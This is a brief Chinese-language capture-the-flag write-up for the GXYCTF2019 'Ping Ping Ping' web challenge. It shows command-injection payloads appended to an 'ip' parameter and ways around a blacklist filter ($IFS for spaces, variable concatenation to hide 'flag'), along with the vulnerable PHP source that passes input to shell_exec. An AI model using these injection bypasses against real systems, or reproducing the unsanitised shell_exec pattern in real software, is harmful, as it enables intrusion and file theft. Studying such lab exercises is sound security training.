# [GXYCTF2019]Ping Ping Ping

打开题目出现提示信息：`/?ip=`

尝试 `/?ip=127.0.0.1` 返回ping的结果

使用 `/?ip=127.0.0.1||ls` 列出当前目录文件:
 - flag.php
 - index.php

尝试 `/?ip=127.0.0.1||cat flag.php` 提示:
*fxck your space!*

尝试 `/?ip=127.0.0.1||cat<flag.php` 提示:
*fxck your symbol!*

使用$IFS替代空格：

`/?ip=127.0.0.1||cat$IFSflag.php`

提示：*fxck your flag!*

发现过滤了关键词：flag、单引号、双引号

读取index.php源代码：
`/?ip=127.0.0.1||cat$IFS$9index.php`
```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

根据代码过滤的内容，构造payload：

`/?ip=127.0.0.1||a=g.php;b=fla;cat$IFS$b$a`

get flag!